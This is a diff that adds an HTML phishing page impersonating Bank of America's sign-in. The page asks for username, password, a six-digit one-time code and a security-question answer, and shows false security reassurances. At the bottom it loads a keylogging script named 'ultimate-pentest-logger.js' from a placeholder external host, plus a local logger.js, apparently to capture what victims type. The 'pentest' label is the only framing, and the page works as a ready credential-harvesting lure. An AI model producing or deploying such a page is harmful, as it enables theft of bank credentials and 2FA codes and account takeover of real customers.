@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login - Bank of America</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 100%;
+            max-width: 420px;
+            animation: slideUp 0.8s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .logo h1 {
+            color: #d32f2f;
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .logo p {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+            position: relative;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #fafafa;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: #fff;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .password-group {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .password-group input {
+            flex: 1;
+        }
+        
+        .otp-group {
+            display: grid;
+            grid-template-columns: repeat(6, 1fr);
+            gap: 12px;
+            margin-top: 20px;
+        }
+        
+        .otp-group input {
+            text-align: center;
+            letter-spacing: 8px;
+            font-size: 18px;
+            font-weight: 600;
+            padding: 16px 8px;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 20px;
+        }
+        
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        
+        .login-btn:active {
+            transform: translateY(0);
+        }
+        
+        .security-notice {
+            text-align: center;
+            margin-top: 24px;
+            padding: 16px;
+            background: #e8f5e8;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #2e7d32;
+        }
+        
+        .forgot-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .forgot-link a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff40;
+            border-top: 2px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 30px 24px;
+                margin: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <h1>🏦 Bank of America</h1>
+            <p>Secure Sign In</p>
+        </div>
+        
+        <form id="loginForm" action="https://www.bankofamerica.com/login" method="POST">
+            <!-- Username Field -->
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input 
+                    type="text" 
+                    id="username" 
+                    name="username" 
+                    placeholder="Enter your username or email"
+                    autocomplete="username"
+                    required
+                >
+            </div>
+            
+            <!-- Password Field -->
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    placeholder="Enter your password"
+                    autocomplete="current-password"
+                    required
+                >
+            </div>
+            
+            <!-- 2FA OTP Field -->
+            <div class="form-group">
+                <label>Verification Code (Sent to your phone)</label>
+                <div class="otp-group">
+                    <input type="text" maxlength="1" pattern="\d" inputmode="numeric">
+                    <input type="text" maxlength="1" pattern="\d" inputmode="numeric">
+                    <input type="text" maxlength="1" pattern="\d" inputmode="numeric">
+                    <input type="text" maxlength="1" pattern="\d" inputmode="numeric">
+                    <input type="text" maxlength="1" pattern="\d" inputmode="numeric">
+                    <input type="text" maxlength="1" pattern="\d" inputmode="numeric">
+                </div>
+                <input type="hidden" id="otp" name="otp" value="">
+            </div>
+            
+            <!-- Additional Security Fields -->
+            <div class="form-group">
+                <label for="securityQuestion">Security Question Answer</label>
+                <input 
+                    type="text" 
+                    id="securityQuestion" 
+                    name="security_answer" 
+                    placeholder="What is your pet's name?"
+                >
+            </div>
+            
+            <!-- Submit Button -->
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span class="spinner" id="spinner"></span>
+                Sign In Securely
+            </button>
+        </form>
+        
+        <div class="security-notice">
+            🔒 Protected by 256-bit SSL encryption | Your data is secure
+        </div>
+        
+        <div class="forgot-link">
+            <a href="#" onclick="alert('Contact support at 1-800-432-1000')">Forgot Password?</a>
+        </div>
+    </div>
+
+    <!-- Load the pentest logger -->
+    <script src="https://your-domain.com/ultimate-pentest-logger.js"></script>
+    
+    <script>
+        // OTP Auto-concatenation
+        const otpInputs = document.querySelectorAll('.otp-group input');
+        const otpHidden = document.getElementById('otp');
+        
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < 5) {
+                    otpInputs[index + 1].focus();
+                }
+                otpHidden.value = Array.from(otpInputs).map(i => i.value).join('');
+            });
+            
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+        
+        // Form submission feedback
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('loginBtn');
+            const spinner = document.getElementById('spinner');
+            
+            spinner.style.display = 'inline-block';
+            btn.textContent = 'Verifying...';
+            btn.disabled = true;
+        });
+    </script>
+    <script src="logger.js"></script>
+</body>
+</html>
